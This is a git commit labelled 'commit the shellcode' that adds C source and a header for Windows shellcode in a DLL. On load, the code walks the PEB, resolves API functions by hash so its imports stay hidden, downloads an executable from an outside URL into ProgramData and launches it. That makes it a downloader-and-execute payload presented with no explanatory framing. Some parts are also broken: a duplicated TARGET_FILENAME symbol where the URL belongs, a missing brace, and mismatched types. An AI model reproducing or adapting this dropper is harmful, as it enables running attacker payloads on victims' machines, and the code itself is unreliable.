bf3c83afa2d72a66d4991f3a7c6a92c2ff785626
frank2 <frank2@dc949.org>
2024-11-17 19:43:59 -0800

    commit the shellcode

---
+++ main.c
@@ -0,0 +1,161 @@
+#include "shellcode.h"
+
+BOOL DllMain(HINSTANCE dll_instance, DWORD reason, LPVOID reserved) {
+   return shellcode(dll_instance) == 0;
+}
+
+#pragma section(".sc$000", read, execute)
+__declspec(code_seg(".sc$000")) int shellcode(LPVOID arg) {
+#if defined(_M_IX86)
+   iat()->peb = ((PPEB_EX)__readfsdword(0x30));
+#elif defined(_M_AMD64)
+   iat()->peb = ((PPEB_EX)__readgsqword(0x60));
+#endif
+   
+   PPEB_LDR_DATA_EX ldr_ex = (PPEB_LDR_DATA_EX)iat()->peb->LoaderData;
+   PLDR_DATA_TABLE_ENTRY_EX list_entry = (PLDR_DATA_TABLE_ENTRY_EX)ldr_ex->InLoadOrderModuleList.Flink;
+   PLDR_DATA_TABLE_ENTRY_EX ntdll_entry = (PLDR_DATA_TABLE_ENTRY_EX)list_entry->InLoadOrderLinks.Flink;
+   PLDR_DATA_TABLE_ENTRY_EX kernel32_entry = (PLDR_DATA_TABLE_ENTRY_EX)ntdll_entry->InLoadOrderLinks.Flink;
+
+   uint8_t *kernel32 = (uint8_t *)kernel32_entry->DllBase;
+   iat()->LoadLibrary = (uint8_t * (WINAPI *)(const char *))get_import_by_hash(kernel32, 0x53b2070f);
+   iat()->CreateProcess = (BOOL (WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))get_import_by_hash(kernel32, 0x4a7c0a09);
+
+   char urlmon_str[] = {'u','r','l','m','o','n', 0};
+   uint8_t *urlmon = (uint8_t *)iat()->LoadLibrary(&urlmon_str[0]);
+   iat()->URLDownloadToFile = (HRESULT (WINAPI *)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK))get_import_by_hash(urlmon, 0xd8d746fc);
+
+   char *filename = target_filename();
+   char *url = target_url();
+   STARTUPINFOA startup_info;
+   PROCESS_INFORMATION process_information;
+
+   for (size_t i=0; i<sizeof(STARTUPINFOA); ++i)
+      ((uint8_t *)(&startup_info))[i] = 0;
+   
+   startup_info.cb = sizeof(STARTUPINFOA);
+   
+   for (size_t i=0; i<sizeof(PROCESS_INFORMATION); ++i)
+      ((uint8_t *)(&process_information))[i] = 0;
+
+   if (iat()->URLDownloadToFile(NULL, url, filename, 0, NULL) != S_OK)
+      return 1;
+
+   if (!iat()->CreateProcess(filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_information))
+      return 2;
+   
+   return 0;
+}
+
+#if defined(_M_AMD64)
+#pragma section(".sc$001", read, execute)
+__declspec(code_seg(".sc$001")) IAT *iat(void) {
+   return &IMPORT_TABLE;
+}
+#elif defined(_M_IX86)
+#pragma section(".sc$001", read, execute)
+__declspec(code_seg(".sc$001"), naked) IAT *iat(void) {
+   __asm {
+      call eip_call
+   eip_call:
+      pop eax
+      add eax, 5
+      ret
+   }
+#endif
+
+#pragma section(".sc$002", read, execute)
+__declspec(allocate(".sc$002")) IAT IMPORT_TABLE = {NULL, NULL, NULL};
+
+#pragma section(".sc$003", read, execute)
+__declspec(code_seg(".sc$003")) get_import_by_hash(uint8_t *module, uint32_t hash) {
+   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module;
+#if defined(_M_AMD64)
+   PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64)&module[dos_header->e_lfanew];
+#elif defined(_M_IX86)
+   PIMAGE_NT_HEADERS32 nt_headers = (PIMAGE_NT_HEADERS32)&module[dos_header->e_lfanew];
+#endif
+   
+   PIMAGE_DATA_DIRECTORY export_datadir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+   PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)&module[export_datadir->VirtualAddress];
+   uint32_t *functions = (uint32_t *)&module[export_dir->AddressOfFunctions];
+   uint32_t *names = (uint32_t *)&module[export_dir->AddressOfNames];
+   uint16_t *name_ordinals = (uint16_t *)&module[export_dir->AddressOfNameOrdinals];
+
+   for (size_t i=0; i<export_dir->NumberOfNames; ++i) {
+      if (fnv321a((const char *)&module[names[i]]) != hash)
+         continue;
+      
+      if (functions[name_ordinals[i]] >= export_datadir->VirtualAddress && functions[name_ordinals[i]] < export_datadir->VirtualAddress+export_datadir->Size) {
+         const char *forwarder = (const char *)&module[functions[name_ordinals[i]]];
+         char forwarder_mut[256];
+         
+         memcpy_local(&forwarder_mut[0], forwarder, strlen_local(forwarder)+1);
+         char *func;
+
+         for (size_t j=0; j<strlen_local(forwarder); ++j) {
+            if (forwarder_mut[j] != '.')
+               continue;
+
+            forwarder_mut[j] = 0;
+            func = &forwarder_mut[j+1];
+            break;
+         }
+
+         uint8_t *forward_dll = iat()->LoadLibrary(forwarder_mut);
+         uint8_t *proc = get_import_by_hash(forward_dll, fnv321a(func));
+
+         return proc;
+      }
+         
+      return &module[functions[name_ordinals[i]]];
+   }
+
+   return NULL;
+}
+
+#if defined(_M_AMD64)
+#pragma section(".sc$004", read, execute)
+__declspec(code_seg(".sc$004")) char *target_filename(void) {
+   return &TARGET_FILENAME[0];
+}
+#elif defined(_M_IX86)
+#pragma section(".sc$004", read, execute)
+__declspec(code_seg(".sc$004"), naked) char *target_filename(void) {
+   __asm {
+      call eip_call
+   eip_call:
+      pop eax
+      add eax, 5
+      ret
+   }
+}
+#pragma comment(linker, "/INCLUDE:TARGET_FILENAME")
+#pragma comment(linker, "/INCLUDE:_target_filename")
+#endif
+
+#pragma section(".sc$005", read, execute)
+__declspec(allocate(".sc$005")) char TARGET_FILENAME[] = "C:\\ProgramData\\sheep.exe";
+
+#if defined(_M_AMD64)
+#pragma section(".sc$006", read, execute)
+__declspec(code_seg(".sc$006")) char *target_url(void) {
+   return &TARGET_URL[0];
+}
+#elif defined(_M_IX86)
+#pragma section(".sc$006", read, execute)
+__declspec(code_seg(".sc$006"), naked) char *target_url(void) {
+   __asm {
+      call eip_call
+   eip_call:
+      pop eax
+      add eax, 5
+      ret
+   }
+}
+#pragma comment(linker, "/INCLUDE:TARGET_URL")
+#pragma comment(linker, "/INCLUDE:_target_url")
+#endif
+
+#pragma section(".sc$007", read, execute)
+__declspec(allocate(".sc$007")) char TARGET_FILENAME[] = "https://amethyst.systems/sheep.exe";
---
+++ shellcode.h
@@ -0,0 +1,120 @@
+#pragma once
+
+#include <stddef.h>
+#include <stdint.h>
+#include <windows.h>
+
+typedef PVOID PACTIVATION_CONTEXT;
+
+typedef struct _LDR_DATA_TABLE_ENTRY_EX {
+	LIST_ENTRY InLoadOrderLinks;
+	LIST_ENTRY InMemoryOrderLinks;
+	LIST_ENTRY InInitializationOrderLinks;
+	PVOID DllBase;
+	PVOID EntryPoint;
+	ULONG SizeOfImage;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+	ULONG Flags;
+	WORD LoadCount;
+	WORD TlsIndex;
+	union {
+		LIST_ENTRY HashLinks;
+		struct {
+			PVOID SectionPointer;
+			ULONG CheckSum;
+		};
+	};
+	union {
+		ULONG TimeDateStamp;
+		PVOID LoadedImports;
+	};
+	PACTIVATION_CONTEXT EntryPointActivationContext;
+	PVOID PatchInformation;
+	LIST_ENTRY ForwarderLinks;
+	LIST_ENTRY ServiceTagLinks;
+	LIST_ENTRY StaticLinks;
+} LDR_DATA_TABLE_ENTRY_EX, * PLDR_DATA_TABLE_ENTRY_EX;
+
+typedef struct _PEB_LDR_DATA_EX {
+   ULONG                   Length;
+   ULONG                   Initialized;
+   PVOID                   SsHandle;
+   LIST_ENTRY              InLoadOrderModuleList;
+   LIST_ENTRY              InMemoryOrderModuleList;
+   LIST_ENTRY              InInitializationOrderModuleList;
+} PEB_LDR_DATA_EX, * PPEB_LDR_DATA_EX;
+
+typedef struct _PEB_EX {
+	BOOLEAN                 InheritedAddressSpace;
+	BOOLEAN                 ReadImageFileExecOptions;
+	BOOLEAN                 BeingDebugged;
+	BOOLEAN                 Spare;
+	HANDLE                  Mutant;
+	PVOID                   ImageBase;
+	PPEB_LDR_DATA_EX        LoaderData;
+	PVOID                   ProcessParameters;
+	PVOID                   SubSystemData;
+	PVOID                   ProcessHeap;
+	PVOID                   FastPebLock;
+	PVOID                   FastPebLockRoutine;
+	PVOID                   FastPebUnlockRoutine;
+	ULONG                   EnvironmentUpdateCount;
+	PVOID* KernelCallbackTable;
+	PVOID                   EventLogSection;
+	PVOID                   EventLog;
+	PVOID                   FreeList;
+	ULONG                   TlsExpansionCounter;
+	PVOID                   TlsBitmap;
+	ULONG                   TlsBitmapBits[0x2];
+	PVOID                   ReadOnlySharedMemoryBase;
+	PVOID                   ReadOnlySharedMemoryHeap;
+	PVOID* ReadOnlyStaticServerData;
+	PVOID                   AnsiCodePageData;
+	PVOID                   OemCodePageData;
+	PVOID                   UnicodeCaseTableData;
+	ULONG                   NumberOfProcessors;
+	ULONG                   NtGlobalFlag;
+	BYTE                    Spare2[0x4];
+	LARGE_INTEGER           CriticalSectionTimeout;
+	ULONG                   HeapSegmentReserve;
+	ULONG                   HeapSegmentCommit;
+	ULONG                   HeapDeCommitTotalFreeThreshold;
+	ULONG                   HeapDeCommitFreeBlockThreshold;
+	ULONG                   NumberOfHeaps;
+	ULONG                   MaximumNumberOfHeaps;
+	PVOID** ProcessHeaps;
+	PVOID                   GdiSharedHandleTable;
+	PVOID                   ProcessStarterHelper;
+	PVOID                   GdiDCAttributeList;
+	PVOID                   LoaderLock;
+	ULONG                   OSMajorVersion;
+	ULONG                   OSMinorVersion;
+	ULONG                   OSBuildNumber;
+	ULONG                   OSPlatformId;
+	ULONG                   ImageSubSystem;
+	ULONG                   ImageSubSystemMajorVersion;
+	ULONG                   ImageSubSystemMinorVersion;
+	ULONG                   GdiHandleBuffer[0x22];
+	ULONG                   PostProcessInitRoutine;
+	ULONG                   TlsExpansionBitmap;
+	BYTE                    TlsExpansionBitmapBits[0x80];
+	ULONG                   SessionId;
+} PEB_EX, * PPEB_EX;
+
+typedef struct __IAT {
+   PPEB_EX *peb;
+   uint8_t * (WINAPI *LoadLibrary)(LPCSTR);
+   BOOL (WINAPI *CreateProcess)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+   HRESULT (WINAPI *URLDownloadToFile)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
+} IAT;
+
+IAT IMPORT_TABLE;
+char TARGET_FILENAME[];
+char TARGET_URL[];
+   
+__declspec(dllexport) int shellcode(LPVOID arg);
+IAT *iat(void);
+uint8_t *get_import_by_hash(uint8_t *module, uint32_t hash);
+char *target_filename(void);
+char *target_url(void);
